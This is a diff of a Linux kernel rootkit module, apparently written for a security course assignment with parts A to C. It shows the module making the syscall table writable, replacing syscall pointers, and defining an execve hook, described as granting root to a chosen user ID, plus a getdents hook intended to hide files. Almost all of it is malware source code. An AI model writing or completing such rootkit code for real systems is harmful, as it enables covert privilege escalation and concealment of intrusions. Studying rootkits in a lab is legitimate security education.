@@ -30,11 +30,6 @@ static unsigned long table_addr;
 module_param(table_addr, ulong, 0);
 MODULE_PARM_DESC(table_addr, "Address of sys_call_table in memory");
 
-//******
-//TODO: NEEDED FOR PART B
-//	Accept root_uid as a kernel module parameter
-//	(see module_param() example above)
-//******
 /*
  * When a user with an effective UID = root_uid runs a command via execve()
  * we make our hook grant them root priv. root_uid's value is provided as a
@@ -109,15 +104,6 @@ int hook_syscall(t_syscall_hook *hook)
   printk(KERN_INFO "Hooking offset %d. Original: %p to New:  %p\n",
                    hook->offset, hook->orig_func, hook->hook_func);
 
-  //********
-  //TODO: NEEDED FOR PART A
-  //
-  //	make the sys_call_table RW before the hook and RO after
-  //
-  //	Since linux-kernel ~2.6.24  the sys_call_table has been in read-only
-  //	memory. We need to mark it rw ourselves, replace
-  //	the syscall	function pointer, and then tidy up after ourselves.
-  //********
   set_addr_rw((unsigned long) sys_call_table);
 
   sys_call_table[hook->offset] = hook->hook_func;
@@ -144,16 +130,11 @@ int unhook_syscall(t_syscall_hook *hook)
   printk(KERN_INFO "Unhooking offset %d back to  %p\n",
                    hook->offset, hook->orig_func);
 
-  //********
-  //TODO: NEEDED FOR PART A
-  //	make the sys_call_table RW before the hook and RO after
-  //********
   set_addr_rw((unsigned long) sys_call_table);
 
   sys_call_table[hook->offset] = hook->orig_func;
 
   set_addr_ro((unsigned long) sys_call_table);
-
 
   //Remember we've undone the hook
   hook->hooked = false;
@@ -230,30 +211,17 @@ int init_module(void)
   sys_call_table = (void *) table_addr;
   printk(KERN_INFO "Syscall table loaded from %p\n", (void*) table_addr);
 
-  //********
-  //TODO: NEEDED FOR PART A
-  //	uncomment the example hook AFTER you have marked the syscall table
-  //	memory RW (see notes above).
-  //********
   set_addr_rw((unsigned long) sys_call_table);
   printk(KERN_INFO "After call to set_addr_rw\n");
 
   //Hook the syscall
   //hook_syscall(new_hook(__NR_open, (void*) &new_open)); //Uncomment to hook open()
-  hook_syscall(new_hook(__NR_execve, (void*) &new_execve));
+  // TODO Add me back
+ // hook_syscall(new_hook(__NR_execve, (void*) &new_execve));
+  hook_syscall(new_hook(__NR_getdents, (void*) &new_getdents));
   printk(KERN_INFO "After call to hook_syscall\n");
 
   set_addr_ro((unsigned long) sys_call_table);
-  printk(KERN_INFO "After call to set_addr_ro\n");
-
-
-  //********
-  //TODO: NEEDED FOR PARTS B AND C
-  //	Hook your new execve and getdents functions after writing them
-  //********
-  // Let's hook execve() for privilege escalation
-  // Let's hook getdents() to hide our files
-
 
   printk(KERN_INFO "Rootkit module loaded successfully!\n");
   return 0; //For successful load
@@ -314,15 +282,8 @@ asmlinkage int new_open(const char *pathname, int flags, mode_t mode)
   printk(KERN_INFO "open() was called for %s\n", pathname);
 
   //Invoke the original syscall
-  return (*orig_func)(pathname, flags, mode);
+  return orig_func(pathname, flags, mode);
 }
-
-  //********
-  //TODO: NEEDED FOR PARTS B AND C
-  //	Write your new execve and getdents functions.
-  //	You will want to add function prototypes to rootkit.h
-  //	Make sure they match the original function definitions.
-  //********
 
 asmlinkage int new_execve(const char *filename, char *const argv[],
                           char *const envp[])
@@ -352,16 +313,16 @@ asmlinkage int new_execve(const char *filename, char *const argv[],
     }
   }
 
-  return (*orig_func)(filename, argv, envp);
+  return orig_func(filename, argv, envp);
 }
 
-asmlinkage int new_getdents(unsigned int fd, linux_dirent *dirp,
+asmlinkage int new_getdents(unsigned int fd, struct linux_dirent *dirp,
                             unsigned int count)
 {
-  int (*orig_func)(unsigned int fd, linux_dirent *dirp, unsigned int count);
+  int (*orig_func)(unsigned int fd, struct linux_dirent *dirp, unsigned int count);
   t_syscall_hook *getdents_hook;
   int ret_val = 0, bpos = 0;
-  linux_dirent *curr = NULL;
+  struct linux_dirent *curr = NULL;
 
   printk(KERN_INFO "getdents() hook invoked.\n");
 
@@ -370,11 +331,22 @@ asmlinkage int new_getdents(unsigned int fd, linux_dirent *dirp,
 
   ret_val = orig_func(fd, dirp, count);
 
-  for (bpos = 0; bpos < ret_val; ) {
-    curr = (linux_dirent*) (dirp + bpos);
-    printk(KERN_INFO "entry: %s\n", curr->d_name);
-    bpos += curr->d_reclen;
+  printk(KERN_INFO "ret_val is %d.\n", ret_val);
+
+  if (dirp == NULL || ret_val < 1) {
+    return ret_val;
   }
+
+  // TODO For now only print the first one
+  curr = (struct linux_dirent*) dirp;
+  printk(KERN_INFO "entry: %s\n", curr->d_name);
+
+// TODO
+//  for (bpos = 0; bpos < ret_val; ) {
+//    curr = (linux_dirent*) (dirp + bpos);
+//    printk(KERN_INFO "entry: %s\n", curr->d_name);
+//    bpos += curr->d_reclen;
+//  }
 
   return ret_val;
 }
